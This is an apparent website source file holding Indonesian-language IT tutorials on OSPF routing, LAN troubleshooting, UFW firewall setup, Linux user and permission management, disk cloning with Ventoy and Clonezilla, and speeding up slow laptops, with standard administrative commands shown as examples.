        "<li><strong>Metric (cost)</strong> — dihitung dari bandwidth link; makin kecil cost, makin disukai</li>" +
        "</ul>" +
        '<h2 id="cisco">2. Konfigurasi di Cisco IOS</h2>' +
        codeBlock(
          "bash",
          "Router> enable\nRouter# configure terminal\n\n! aktifkan protokol OSPF dengan process-id lokal\nRouter(config)# router ospf 1\n\n! tentukan network address + wildcard + area\nRouter(config-router)# network 10.0.0.0 0.0.0.255 area 0\nRouter(config-router)# network 192.168.10.0 0.0.0.255 area 0\n\n! set router ID manual agar stabil\nRouter(config-router)# router-id 1.1.1.1\nRouter(config-router)# exit\n\n! verifikasi neighbor & tabel routing\nRouter# show ip ospf neighbor\nRouter# show ip ospf database\nRouter# show ip route ospf        # kode 'O' = jalur OSPF"
        ) +
        callout(
          "warning",
          "Wildcard mask OSPF (<code>0.0.0.255</code>) adalah <strong>kebalikan</strong> dari subnet mask biasa. Pastikan tidak tertukar — wildcard yang salah membuat interface tidak masuk area OSPF."
        ) +
        '<h2 id="mikrotik">3. Konfigurasi di MikroTik (RouterOS)</h2>' +
        codeBlock(
          "bash",
          "# aktifkan instance OSPF\n/routing ospf instance add name=ospf1 router-id=1.1.1.1\n\n# masukkan interface ke area\n/routing ospf interface add interface=ether1 network=10.0.0.0/24 area=backbone\n/routing ospf interface add interface=ether2 network=192.168.10.0/24 area=backbone\n\n# tambahkan network statis ke tabel OSPF\n/routing ospf network add network=10.0.0.0/24 area=backbone\n/routing ospf network add network=192.168.10.0/24 area=backbone\n\n# verifikasi neighbor & path\n/routing ospf neighbor print\n/routing ospf database print\n/ip route print where routing-mark=\"ospf\""
        ) +
        '<h2 id="cost">4. Menyesuaikan Cost / Metric</h2>' +
        codeBlock(
          "bash",
          "# CISCO: cost manual pada interface\nRouter(config)# interface g0/0\nRouter(config-if)# ip ospf cost 10\n\n# MIKROTIK: set cost via interface-auth / cost\n/routing ospf interface set [find interface=ether1] cost=10\n\n# semakin kecil cost -> jalur lebih disukai\n# default cost OSPF = 10^8 / bandwidth"
        ) +
        '<h2 id="verifikasi">5. Verifikasi &amp; Troubleshooting</h2>' +
        codeBlock(
          "bash",
          "# ---- cek Cisco ----\nRouter# show ip ospf neighbor\n#   FULL/BDR  = tetangga terbentuk sempurna\n#   DOWN/INIT = neighbor belum terbentuk -> cek area & auth\n\nRouter# show ip protocols\nRouter# show ip ospf interface brief\n\n# ---- cek MikroTik ----\n/routing ospf neighbor print\n#   state=full berarti adjacency OK\n\n# pastikan area cocok di kedua sisi!\n# pastikan network statement mencakup interface aktif"
        ) +
        '<table><thead><tr><th>Masalah</th><th>Penyebab Umum</th></tr></thead><tbody>' +
        "<tr><td>Neighbor tidak muncul</td><td>Area tidak cocok / network salah / auth beda</td></tr>" +
        "<tr><td>Jalur OSPF tidak masuk routing</td><td>Wildcard salah / interface tidak aktif</td></tr>" +
        "<tr><td>Routing loop</td><td>Cost tidak konsisten / redistribusi salah</td></tr>" +
        "</tbody></table>" +
        '<h2 id="ospf-vs-static">6. OSPF vs Routing Statis</h2>' +
        '<table><thead><tr><th>Aspek</th><th>Statis</th><th>OSPF</th></tr></thead><tbody>' +
        "<tr><td>Perawatan</td><td>Manual per router</td><td>Otomatis</td></tr>" +
        "<tr><td>Skalabilitas</td><td>Sulit di jaringan besar</td><td>Skalabel</td></tr>" +
        "<tr><td>Konvergensi</td><td>Tidak adaptif</td><td>Adaptif saat link putus</td></tr>" +
        "<tr><td>Resource</td><td>Rendah</td><td>Butuh CPU/RAM (LSDB)</td></tr>" +
        "</tbody></table>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Kunci OSPF: <strong>area harus konsisten</strong> (dan area 0 sebagai backbone), <strong>wildcard mask benar</strong>, dan <strong>router ID unik</strong>. Setelah adjacency terbentuk (state FULL), OSPF mengurus pembaruan jalur otomatis — menghemat perawatan dibanding routing statis di jaringan yang terus bertumbuh.</p>" +
        callout(
          "tip",
          "Naik level: pelajari <strong>OSPF multi-area</strong> (area non-backbone) untuk membatasi ukuran LSDB di jaringan besar, dan perbandingan OSPF dengan protokol lain seperti EIGRP dan BGP.",
          "TIPS"
        ),
    },

    "networking-lan-troubleshooting": {
      id: "networking-lan-troubleshooting",
      crumb: "Troubleshooting Jaringan LAN",
      title: "Troubleshooting Jaringan LAN: Kabel UTP, IP Conflict, & Ping Timeout",
      category: "networking",
      difficulty: "Beginner",
      excerpt:
        "Panduan sistematis memecahkan masalah jaringan kantor/rumah: kabel UTP tidak terbaca, konflik IP, hingga ping timeout — lengkap dengan alur diagnostik bertahap.",
      date: "2026-10-08",
      readTime: 12,
      lab: "PC + Switch + Cable Tester",
      author: "Admin KBHub",
      tags: ["lan", "troubleshooting", "utp", "networking"],
      content:
        callout(
          "note",
          "Troubleshooting jaringan yang baik selalu <strong>sistematis</strong>: mulai dari lapisan fisik (Layer 1) ke atas. Jangan lompat ke config router sebelum memastikan kabel dan lampu port dalam kondisi baik."
        ) +
        '<h2 id="alur">1. Alur Diagnostik Bertingkat</h2>' +
        "<ol>" +
        "<li><strong>Fisik</strong> — kabel, konektor, lampu port switch</li>" +
        "<li><strong>Data link</strong> — NIC aktif, DHCP berjalan, tidak ada konflik IP</li>" +
        "<li><strong>Network</strong> — IP, subnet, gateway, DNS benar</li>" +
        "<li><strong>Connectivity</strong> — ping gateway, lalu ke luar</li>" +
        "</ol>" +
        '<h2 id="kabel">2. Masalah Kabel UTP</h2>' +
        "<p>Gejala: port switch menyala oranye terus, NIC <code>Network cable unplugged</code>, atau koneksi hanya 100 Mbps (bukan 1 Gbps).</p>" +
        codeBlock(
          "bash",
          "# standar penyambungan (T568B paling umum)\n# urutan warna: putih-oren, oren, putih-hijau, biru,\n#               putih-biru, hijau, putih-coklat, coklat\n\n# periksa status NIC di Windows\nncpa.cpl\n#   klik kanan adapter -> Status\n#   Speed: 1.0 Gbps berarti kabel & konektor sehat\n\n# di Linux\nethtool eth0 | grep Speed\n#   Speed: 1000Mb/s"
        ) +
        "<ul>" +
        "<li>Gunakan <strong>cable tester</strong> untuk memastikan urutan pin benar di kedua ujung</li>" +
        "<li>Periksa panjang kabel (maksimal 100 meter untuk UTP)</li>" +
        "<li>Hindari menyimpul kabel dekat sumber interferensi (kabel listrik, trafo)</li>" +
        "<li>Ganti konektor RJ45 bila pin kuningan kendor atau berkarat</li>" +
        "</ul>" +
        '<h2 id="ip-conflict">3. IP Conflict</h2>' +
        "<p>Gejala: muncul peringatan <em>&quot;The IP address ... is already in use&quot;</em> (Windows) atau koneksi tidak stabil.</p>" +
        codeBlock(
          "bash",
          "# di Windows: cek IP & deteksi konflik\nipconfig /all\n#   jika muncul \"Duplicate IP address\" -> konflik terdeteksi\n\n# solusi cepat: perbarui lease DHCP\nipconfig /release\nipconfig /renew\n\n# cek siapa yang memakai IP (arp)\narp -a\n#   bandingkan MAC di baris IP yang konflik\n\n# ---- di Linux ----\nip a\nping -c 2 <IP>            # jika ada balasan padahal belum di-set -> konflik\n# aktifkan deteksi ARP conflict\nsudo arping -D -I eth0 <IP>"
        ) +
        callout(
          "warning",
          "Konflik IP paling sering terjadi karena <strong>IP statis yang di-hardcode</strong> bertabrakan dengan rentang DHCP server. Solusi jangka panjang: alokasikan IP statis di <em>luar</em> rentang DHCP, atau gunakan DHCP reservation."
        ) +
        '<h2 id="ping">4. Ping Timeout vs Destination Host Unreachable</h2>' +
        '<table><thead><tr><th>Pesan</th><th>Arti</th><th>Fokus cek</th></tr></thead><tbody>' +
        "<tr><td>Request timed out</td><td>Paket terkirim tapi tidak dibalas</td><td>Firewall / target mati</td></tr>" +
        "<tr><td>Destination host unreachable</td><td>Tidak ada jalur ke target</td><td>Gateway / routing / subnet salah</td></tr>" +
        "<tr><td>General failure</td><td>NIC / stack jaringan bermasalah</td><td>Adapter, driver</td></tr>" +
        "</tbody></table>" +
        codeBlock(
          "bash",
          "# urutan ping yang benar (dari dalam ke luar)\nping 127.0.0.1        # 1. loopback -> stack TCP/IP sehat\nping <IP-sendiri>     # 2. NIC berfungsi\nping <gateway>        # 3. jalur lokal OK\nping 8.8.8.8          # 4. routing ke internet OK\nping google.com       # 5. DNS berfungsi\n\n# telusuri jalur bila gagal di tengah\ntracert 8.8.8.8        # Windows\ntraceroute 8.8.8.8     # Linux"
        ) +
        '<h2 id="dhcp-dns">5. Cek DHCP &amp; DNS</h2>' +
        codeBlock(
          "bash",
          "# pastikan klien mendapat IP dari DHCP yang benar\nipconfig /all | findstr \"DHCP Server\"\n\n# perbarui DNS cache (sering menyelesaikan 'tidak bisa buka web')\nipconfig /flushdns      # Windows\nsudo systemd-resolve --flush-caches   # Linux\n\n# uji resolver DNS\nnslookup google.com\n#   Server: <gateway>   Address: <ip>\n#   Name: google.com"
        ) +
        '<h2 id="checklist">6. Checklist Cepat</h2>' +
        '<table><thead><tr><th>Gejala</th><th>Cek pertama</th></tr></thead><tbody>' +
        "<tr><td>Port switch oranye</td><td>Kabel, connector, tester UTP</td></tr>" +
        "<tr><td>Tidak dapat IP</td><td>Rentang DHCP, kabel, lease</td></tr>" +
        "<tr><td>IP conflict</td><td>IP statis vs rentang DHCP, arp -a</td></tr>" +
        "<tr><td>Ping gateway gagal</td><td>IP/subnet, kabel, port switch</td></tr>" +
        "<tr><td>Internet lambat</td><td>Duplex mismatch, kabel jelek, bandwidth</td></tr>" +
        "</tbody></table>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Troubleshooting LAN yang efektif selalu turun dari <strong>lapisan fisik ke atas</strong>: pastikan kabel sehat dan lampu port hijau, baru cek IP/konflik, lalu routing dan DNS. Dengan urutan ini, kamu mengeliminasi penyebab termudah lebih dulu dan menghemat waktu diagnosis.</p>" +
        callout(
          "tip",
          "Siapkan 'tas diagnostik' berisi cable tester, spare kabel UTP, dan USB Ethernet adapter. Alat sederhana ini menyelesaikan sebagian besar masalah jaringan di lapangan dalam hitungan menit.",
          "TIPS"
        ),
    },

    "linux-ufw-firewall": {
      id: "linux-ufw-firewall",
      crumb: "Firewall UFW di Ubuntu",
      title: "Keamanan Server: Konfigurasi Firewall UFW di Ubuntu",
      category: "linux",
      difficulty: "Intermediate",
      excerpt:
        "Panduan lengkap UFW: kebijakan default, menambah/mengatur rule, logging, rate limiting, hingga penerapan pada server produksi dengan aman.",
      date: "2026-10-07",
      readTime: 13,
      lab: "Ubuntu 22.04 / 24.04 Server",
      author: "Admin KBHub",
      tags: ["ufw", "firewall", "security", "ubuntu"],
      content:
        callout(
          "warning",
          "Selalu <strong>izinkan SSH (port 22) sebelum mengaktifkan UFW</strong>. Jika firewall aktif dan port 22 tertutup tanpa akses console, kamu terkunci dari server jarak jauh.",
          "PERINGATAN"
        ) +
        '<h2 id="konsep">1. Konsep &amp; Instalasi</h2>' +
        "<p><strong>UFW (Uncomplicated Firewall)</strong> adalah lapisan sederhana di atas <code>iptables</code> yang memudahkan pengaturan firewall di Ubuntu.</p>" +
        codeBlock(
          "bash",
          "sudo apt update && sudo apt install ufw -y\n\n# cek status awal\nsudo ufw status verbose\n# Status: inactive"
        ) +
        '<h2 id="default-policy">2. Kebijakan Default (Deny Incoming)</h2>' +
        "<p>Prinsip keamanan: <strong>tolak semua yang masuk</strong>, izinkan hanya yang dibutuhkan (whitelist).</p>" +
        codeBlock(
          "bash",
          "sudo ufw default deny incoming\nsudo ufw default allow outgoing\n\n# bila server butuh forwarding (router/NAT):\n# sudo ufw default allow routed"
        ) +
        '<h2 id="rule">3. Menambah &amp; Mengatur Rule</h2>' +
        codeBlock(
          "bash",
          "# izinkan service umum (port otomatis dibuka)\nsudo ufw allow OpenSSH\nsudo ufw allow 'Nginx Full'      # 80 + 443\n\n# izinkan port spesifik\nsudo ufw allow 8080/tcp\nsudo ufw allow 3306/tcp          # MySQL (hati-hati, jangan dari publik)\n\n# batasi ke IP tertentu saja\nsudo ufw allow from 192.168.1.0/24 to any port 22\n\n# hapus rule\nsudo ufw delete allow 8080/tcp\n\n# daftar semua rule dengan nomor\nsudo ufw status numbered"
        ) +
        callout(
          "note",
          "Perintah <code>ufw allow OpenSSH</code> lebih aman daripada <code>ufw allow 22/tcp</code> karena mengikuti port default yang benar meski kamu mengubah <code>sshd_config</code> ke port lain."
        ) +
        '<h2 id="logging">4. Logging</h2>' +
        codeBlock(
          "bash",
          "# aktifkan log untuk packet yang di-drop\nsudo ufw logging on        # medium (default)\n# sudo ufw logging high     # lebih detail, bisa memenuhi disk\n\n# pantau log\nsudo tail -f /var/log/ufw.log\n\n# contoh baris log:\n# [UFW BLOCK] IN=eth0 SRC=203.0.113.5 DST=<IP> PROTO=TCP DPT=22"
        ) +
        '<h2 id="rate-limit">5. Rate Limiting (Anti Brute Force)</h2>' +
        "<p>UFW bisa membatasi percobaan koneksi berulang dalam waktu singkat — pertahanan murah terhadap brute force SSH.</p>" +
        codeBlock(
          "bash",
          "# batasi 6 percobaan per 30 detik\nsudo ufw limit OpenSSH\n\n# dengan rate spesifik (6/30s)\nsudo ufw limit from any to any port 22 proto tcp\n\n# status setelah diterapkan\nsudo ufw status verbose\n# 22/tcp                   ALLOW IN    Anywhere  # LIMIT in 6/30sec"
        ) +
        '<h2 id="app-profile">6. Application Profiles</h2>' +
        codeBlock(
          "bash",
          "# lihat daftar profile aplikasi yang tersedia\nsudo ufw app list\n#   Available applications:\n#     OpenSSH\n#     Nginx Full\n#     Samba\n\n# lihat detail port yang dibuka sebuah profile\nsudo ufw app info 'Nginx Full'\n#   Ports: 80,443/tcp"
        ) +
        '<h2 id="aman">7. Menerapkan dengan Aman (Tanpa Terkunci)</h2>' +
        codeBlock(
          "bash",
          "# TRIK AMAN: aktifkan UFW tanpa langsung memblokir\n# 1. ubah mode ke 'allow' sementara\nsudo ufw default allow incoming\nsudo ufw enable\n\n# 2. tambahkan semua rule yang dibutuhkan dulu\nsudo ufw allow OpenSSH\nsudo ufw allow 'Nginx Full'\n\n# 3. SETELAH yakin bisa masuk, baru balikkan ke deny\nsudo ufw default deny incoming\nsudo ufw status verbose"
        ) +
        '<h2 id="verifikasi">8. Verifikasi &amp; Reset</h2>' +
        codeBlock(
          "bash",
          "sudo ufw status numbered\nsudo ufw status verbose\n\n# uji dari mesin lain: port tertutup harus timeout\nnc -vz <IP-server> 22      # dari luar\n\n# bila salah config dan terkunci (via console):\nsudo ufw disable            # matikan total\nsudo ufw reset              # kembali ke setelan awal"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Pola UFW yang aman: <strong>deny incoming</strong>, izinkan hanya port yang benar-benar dibutuhkan, aktifkan <strong>logging</strong> dan <strong>rate limiting</strong> untuk SSH. Kuncinya adalah menerapkan secara bertahap — tambahkan semua rule sebelum membalik kebijakan ke deny, agar tidak terkunci keluar.</p>" +
        "<p>Ringkasan perintah yang paling sering dipakai:</p>" +
        "<ul>" +
        "<li><code>sudo ufw status verbose</code> — cek status &amp; semua rule aktif</li>" +
        "<li><code>sudo ufw allow 8080/tcp</code> — buka port baru (whitelist)</li>" +
        "<li><code>sudo ufw delete allow 8080/tcp</code> — hapus rule</li>" +
        "<li><code>sudo ufw limit OpenSSH</code> — izinkan SSH dengan rate limit</li>" +
        "<li><code>sudo ufw logging on</code> — aktifkan log packet yang di-drop</li>" +
        "<li><code>sudo ufw disable</code> — matikan firewall darurat (via console)</li>" +
        "</ul>" +
        callout(
          "tip",
          "Untuk perlindungan lebih lanjut, pasang <strong>fail2ban</strong> di atas UFW — ia memblokir IP otomatis setelah gagal login berulang, melengkapi rate limiting bawaan.",
          "TIPS"
        ),
    },

    "linux-user-management": {
      id: "linux-user-management",
      crumb: "Manajemen Pengguna & Hak Akses",
      title: "Manajemen Pengguna & Hak Akses (Chmod, Chown) di Linux",
      category: "linux",
      difficulty: "Beginner",
      excerpt:
        "Panduan lengkap mengelola user & group di Linux: useradd, usermod, chmod, chown, hingga konfigurasi sudo dengan benar dan aman.",
      date: "2026-10-06",
      readTime: 12,
      lab: "Ubuntu 22.04 / Debian (Terminal)",
      author: "Admin KBHub",
      tags: ["linux", "user-management", "chmod", "chown"],
      content:
        callout(
          "note",
          "Manajemen pengguna adalah tugas admin Linux paling sering dilakukan. Artikel ini fokus pada <strong>operasi sehari-hari</strong>; untuk kedalaman model permission &amp; special bits, baca <a href='article.html?id=linux-permissions-umask' class='text-emerald-400 underline'>Permissions, umask &amp; Special Bits</a>."
        ) +
        '<h2 id="user">1. Menambah &amp; Mengelola User</h2>' +
        codeBlock(
          "bash",
          "# buat user baru\nsudo useradd -m -s /bin/bash andi\n#   -m : buat home directory\n#   -s : shell login\n\n# set password\nsudo passwd andi\n\n# ubah shell login\nsudo usermod -s /bin/zsh andi\n\n# tambahkan user ke group sudo (agar bisa pakai sudo)\nsudo usermod -aG sudo andi\n#   -a : append (JANGAN lupa, atau group lain hilang)\n#   -G : secondary group\n\n# hapus user (beserta home)\nsudo userdel -r andi"
        ) +
        callout(
          "warning",
          "Selalu gunakan <strong><code>-a</code> (append)</strong> saat menambah user ke group dengan <code>usermod -aG</code>. Tanpa <code>-a</code>, seluruh group lama user akan ditimpa — sering menyebabkan user kehilangan akses sudo."
        ) +
        '<h2 id="group">2. Manajemen Group</h2>' +
        codeBlock(
          "bash",
          "# buat group\ngroupadd developers\n\n# tambahkan user ke group\nsudo usermod -aG developers andi\n\n# lihat group user\ngroups andi\n#   andi : andi developers sudo\n\n# ubah pemilik group file/folder\nsudo chown :developers /srv/project\n\n# list semua group\ncat /etc/group | cut -d: -f1"
        ) +
        '<h2 id="chmod">3. chmod — Mengubah Izin Akses</h2>' +
        codeBlock(
          "bash",
          "# notasi oktal (angka)\n# r=4, w=2, x=1\nchmod 644 file.txt      # rw-r--r--\nchmod 755 script.sh     # rwxr-xr-x\nchmod 600 secret.key    # rw-------\n\n# notasi simbolis\nchmod u+x script.sh     # tambah eksekusi untuk owner\ngo-w file.txt          # hapus tulis untuk group & other\n\n# rekursif\nchmod -R 755 /var/www/html"
        ) +
        '<h2 id="chown">4. chown — Mengubah Pemilik</h2>' +
        codeBlock(
          "bash",
          "# ubah pemilik file\nsudo chown andi:developers file.txt\n#   format: chown <user>:<group> <file>\n\n# ubah pemilik saja (group tetap)\nsudo chown andi file.txt\n\n# ubah group saja\nsudo chgrp developers file.txt\n\n# rekursif (umum untuk direktori web)\nsudo chown -R www-data:www-data /var/www/html\n\n# verifikasi\nls -l file.txt\n# -rw-r--r-- 1 andi developers 0 Jan 1 file.txt"
        ) +
        '<h2 id="sudo">5. Konfigurasi Sudo (/etc/sudoers)</h2>' +
        codeBlock(
          "bash",
          "# SELALU edit via visudo (memvalidasi syntax, mencegah lockout)\nsudo visudo\n\n# tambahkan di akhir file:\n# andi   ALL=(ALL:ALL) ALL\n#      user  host  (runas)  cmd\n\n# contoh: izinkan tanpa password untuk service tertentu\n# andi ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx\n\n# grup admin (lebih rapi daripada edit per user)\n# %sudo   ALL=(ALL:ALL) ALL"
        ) +
        callout(
          "warning",
          "Jangan pernah mengedit <code>/etc/sudoers</code> langsung dengan text editor biasa. Selalu pakai <code>visudo</code> — jika ada kesalahan syntax, file rusak bisa membuat <strong>tidak ada satupun user bisa sudo</strong> (termasuk kamu)."
        ) +
        '<h2 id="password">6. Kebijakan Password</h2>' +
        codeBlock(
          "bash",
          "# kunci akun (user tidak bisa login)\nsudo usermod -L andi\n\n# buka kunci\nsudo usermod -U andi\n\n# set expiry password (90 hari)\nsudo chage -M 90 andi\n\n# lihat info akun & expiry\nsudo chage -l andi\n#   Last password change    : Jan 1, 2026\n#   Password expires        : Apr 1, 2026\n#   Account expires         : never"
        ) +
        '<h2 id="monitor">7. Memantau Siapa yang Login</h2>' +
        codeBlock(
          "bash",
          "# siapa yang sedang login\nwho\nw\n\n# riwayat login terakhir\nlast -n 10\n\n# percobaan login (sukses & gagal)\ngrep 'Accepted' /var/log/auth.log | tail -n 20\ngrep 'Failed'   /var/log/auth.log | tail -n 20"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Alur kerja manajemen user yang rapi: <strong>buat user &amp; group</strong> → <strong>tambahkan ke group yang tepat (dengan <code>-aG</code>)</strong> → <strong>atur permission file (<code>chmod</code>/<code>chown</code>)</strong> → <strong>beri akses sudo seperlunya via <code>visudo</code></strong>. Prinsip <em>least privilege</em> — beri akses sesedikit mungkin yang dibutuhkan — adalah pondasi keamanan server.</p>" +
        "<p>Daftar perintah inti yang wajib dihafal:</p>" +
        "<ul>" +
        "<li><code>sudo useradd -m -s /bin/bash nama</code> — buat user + home directory</li>" +
        "<li><code>sudo usermod -aG group nama</code> — tambahkan user ke group (selalu pakai <code>-a</code>)</li>" +
        "<li><code>groups nama</code> — lihat seluruh group milik user</li>" +
        "<li><code>chmod 755 / chmod u+x</code> — ubah izin akses (oktal / simbolis)</li>" +
        "<li><code>sudo chown user:group file</code> — ubah pemilik &amp; group file</li>" +
        "<li><code>sudo visudo</code> — edit aturan sudo dengan aman (divalidasi syntax-nya)</li>" +
        "</ul>" +
        callout(
          "tip",
          "Untuk tim, hindari membagi satu akun bersama. Buatkan <strong>akun individual</strong> untuk tiap anggota agar aktivitas bisa dilacak via <code>last</code> dan <code>auth.log</code>.",
          "TIPS"
        ),
    },

    "itsupport-cloning-ventoy-clonezilla": {
      id: "itsupport-cloning-ventoy-clonezilla",
      crumb: "Cloning Disk dengan Clonezilla",
      title: "Cara Cloning Harddisk / SSD Menggunakan Ventoy & Clonezilla",
      category: "itsupport",
      difficulty: "Intermediate",
      excerpt:
        "Panduan lengkap mengganti/backup disk: menyiapkan USB multi-boot dengan Ventoy, menjalankan Clonezilla untuk imaging, hingga restorasi dan verifikasi.",
      date: "2026-10-05",
      readTime: 14,
      lab: "PC + USB 8GB + Clonezilla Live",
      author: "Admin KBHub",
      tags: ["clonezilla", "ventoy", "cloning", "backup"],
      content:
        callout(
          "warning",
          "<strong>Backing up data adalah langkah wajib pertama.</strong> Proses cloning menimpa tujuan — pastikan target adalah disk yang benar dan data penting sudah dicadangkan sebelum melanjutkan.",
          "PERINGATAN"
        ) +
        '<h2 id="konsep">1. Konsep: Clone vs Image</h2>' +
        '<table><thead><tr><th>Metode</th><th>Penjelasan</th><th>Kapan pakai</th></tr></thead><tbody>' +
        "<tr><td>Direct clone</td><td>Disk → disk langsung</td><td>Ganti SSD, 1:1</td></tr>" +
        "<tr><td>Imaging</td><td>Disk → file image (.img/.dd)</td><td>Backup, deploy banyak PC</td></tr>" +
        "<tr><td>Restorasi</td><td>File image → disk</td><td>Pulihkan / deploy ulang</td></tr>" +
        "</tbody></table>" +
        '<h2 id="ventoy">2. Menyiapkan USB dengan Ventoy</h2>' +
        "<p><strong>Ventoy</strong> memungkinkan satu USB menampung banyak ISO bootable sekaligus — sangat praktis untuk teknisi.</p>" +
        codeBlock(
          "bash",
          "# 1. unduh Ventoy (ventoy.net) untuk Windows/Linux\n# 2. install ke USB (HATI-HATI: pilih drive yang benar!)\n#    Windows : Ventoy2Disk.exe -> pilih USB -> Install\n#    Linux   : sudo ./Ventoy2Disk.sh -i /dev/sdX\n\n# 3. setelah terpasang, USB punya partisi 'Ventoy'\n#    cukup SALIN file .iso ke partisi tersebut\n#    (bisa banyak ISO sekaligus)\n\n# 4. boot dari USB -> pilih ISO dari menu Ventoy\n#    (mis. clonezilla-live.iso, windows.iso, ubuntu.iso)"
        ) +
        callout(
          "note",
          "Keunggulan Ventoy dibanding Rufus/BalenaEtcher: tidak perlu menulis ulang USB tiap ganti ISO. Cukup salin file ISO baru, langsung muncul di menu boot."
        ) +
        '<h2 id="clonezilla">3. Menjalankan Clonezilla (Disk → Image)</h2>' +
        "<ol>" +
        "<li>Boot dari USB Ventoy → pilih <strong>Clonezilla Live</strong></li>" +
        "<li>Pilih bahasa, lalu <em>device-image</em> (simpan sebagai file)</li>" +
        "<li>Pilih lokasi image (partisi eksternal / jaringan)</li>" +
        "<li>Pilih mode <strong>beginner</strong>, lalu <em>savedisk</em></li>" +
        "<li>Beri nama image (mis. <code>backup-laptop-2026</code>)</li>" +
        "<li>Pilih sumber disk asal, konfirmasi, tunggu hingga selesai</li>" +
        "</ol>" +
        codeBlock(
          "bash",
          "# ringkasan alur Clonezilla (mode expert tersedia):\n# Clonezilla Live\n#   -> device-image        (disk ke file image)\n#   -> local_dev           (partisi eksternal)\n#   -> savedisk            (buat image dari disk)\n#   -> pilih disk sumber   (mis. sda)\n#   -> beri nama image\n#   -> konfirmasi 'y' beberapa kali\n\n# untuk clone langsung disk-ke-disk pilih 'disk_to_local_disk'"
        ) +
        '<h2 id="restorasi">4. Restorasi (Image → Disk)</h2>' +
        codeBlock(
          "bash",
          "# alur restorasi:\n#   -> device-image\n#   -> local_dev (pilih partisi berisi image)\n#   -> restoredisk\n#   -> pilih nama image\n#   -> pilih disk TUJUAN (hati-hati!)\n#   -> konfirmasi\n\n# perintah equivalen CLI Clonezilla (untuk referensi):\n# ocs-sr -g auto -e2ckks -j2 -c \\\n#   restoredisk backup-laptop-2026 sdb"
        ) +
        '<h2 id="verifikasi">5. Verifikasi Hasil</h2>' +
        codeBlock(
          "bash",
          "# setelah clone/restore, periksa dari sistem operasi live\n# cek partisi terbaca\nsudo fdisk -l\nsudo blkid\n\n# bandingkan jumlah data\nsudo du -sh /mnt/sumber/*\nsudo du -sh /mnt/tujuan/*\n\n# tes boot: lepas disk lama, biarkan disk baru terpasang\n# pastikan OS bisa boot normal"
        ) +
        '<h2 id="tips">6. Tips Praktis</h2>' +
        "<ul>" +
        "<li>Catat <strong>urutan drive</strong> sebelum mulai — menimpa disk yang salah adalah kesalahan fatal</li>" +
        "<li>Untuk upgrade HDD → SSD, gunakan mode <strong>disk_to_local_disk</strong> langsung</li>" +
        "<li>Simpan image di <strong>media terpisah</strong> dari disk yang di-backup (prinsip 3-2-1)</li>" +
        "<li>Image bisa dikompres untuk menghemat ruang (Clonezilla menawarkan opsi <code>-z9</code>)</li>" +
        "<li>Uji restorasi secara berkala — image yang belum pernah direstore belum tentu valid</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Kombinasi <strong>Ventoy + Clonezilla</strong> adalah senjata wajib teknisi: satu USB bisa memuat banyak ISO bootable, dan Clonezilla menangani imaging/restorasi disk secara andal. Kunci sukses: <strong>backup dulu, kenali urutan disk, verifikasi hasil</strong>.</p>" +
        callout(
          "tip",
          "Alternatif berbasis GUI: <strong>Rescuezilla</strong> (turunan Clonezilla dengan antarmuka grafis) — cocok bila kamu atau klien kurang nyaman dengan menu teks.",
          "TIPS"
        ),
    },

    "itsupport-laptop-lemot": {
      id: "itsupport-laptop-lemot",
      crumb: "Mengatasi Laptop Lemot",
      title: "Tips & Trik Mengatasi Laptop Lemot: Perawatan Hardware & Software",
      category: "itsupport",
      difficulty: "Beginner",
      excerpt:
        "Panduan lengkap mempercepat laptop lemot: pembersihan startup, cek RAM & suhu, optimasi penyimpanan, hingga tanda-tanda perlu upgrade hardware.",
      date: "2026-10-04",
      readTime: 12,
      lab: "Laptop Windows 10/11",
      author: "Admin KBHub",
      tags: ["laptop", "performance", "maintenance", "troubleshooting"],
      content:
        callout(
          "note",
          "Laptop lemot hampir selalu kombinasi dari <strong>software yang menumpuk</strong> dan <strong>hardware yang menua</strong>. Artikel ini mengurutkan dari yang gratis (software) ke yang butuh biaya (upgrade hardware)."
        ) +
        '<h2 id="diagnosis">1. Diagnosis Awal</h2>' +
        "<p>Kenali dulu sumber masalahnya — CPU, RAM, atau disk:</p>" +
        codeBlock(
          "bash",
          "# buka Task Manager (Ctrl+Shift+Esc)\n#   tab Performance -> perhatikan:\n#   CPU  : Usage tinggi terus -> proses bermasalah\n#   Memory: Usage > 85%     -> RAM kurang\n#   Disk : Usage 100% terus -> HDD lama / SSD sekarat\n\n# dari PowerShell: cek proses paling rakus\nGet-Process | Sort-Object CPU -Descending | Select-Object -First 10 Name, CPU\nGet-Process | Sort-Object WS -Descending | Select-Object -First 10 Name, @{N='MB';E={[int]($_.WS/1MB)}}"
        ) +
        '<h2 id="startup">2. Nonaktifkan Program Startup</h2>' +
        codeBlock(
          "bash",
          "# Task Manager -> tab Startup\n#   klik kanan -> Disable untuk yang tidak perlu\n#   (updater cloud game, chat app, vendor bloatware)\n\n# kelola startup via PowerShell\nGet-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location\n\n# matikan service startup yang tidak perlu (pilih-pilih!)\nservices.msc"
        ) +
        callout(
          "warning",
          "Jangan sembarangan mematikan service yang tidak dikenali — beberapa penting untuk keamanan dan fungsi sistem. Nonaktifkan yang jelas-jelas bloatware ( updater aplikasi pihak ketiga, tools promo)."
        ) +
        '<h2 id="disk">3. Optimasi Penyimpanan</h2>' +
        codeBlock(
          "bash",
          "# jalankan Disk Cleanup\ncleanmgr /d C:\n\n# kosongkan folder sampah manual\n#   %temp%   -> C:\\Users\\<user>\\AppData\\Local\\Temp\n#   Windows\\SoftwareDistribution\\Download\n\n# OPTIMIZE SSD (TRIM) — JANGAN defrag SSD!\noptimize-Volume -DriveLetter C -ReTrim -Verbose\n\n# untuk HDD lama, defrag dulu\n#   Defragment and Optimize Drives -> Optimize"
        ) +
        '<h2 id="hardware">4. Cek Hardware: RAM, Suhu, Disk</h2>' +
        codeBlock(
          "bash",
          "# kapasitas & kecepatan RAM\nwmic memorychip get capacity, speed, devicelocator\n\n# health disk (SMART) — tandanya SSD/HDD sekarat\nwmic diskdrive get status\n#   Status = OK  -> sehat\n#   Status = Pred Fail -> segera backup & ganti!\n\n# model & kesehatan SSD (lebih detail via tool vendor)\n#   CrystalDiskInfo (gratis) untuk lihat % Life & Temperatur"
        ) +
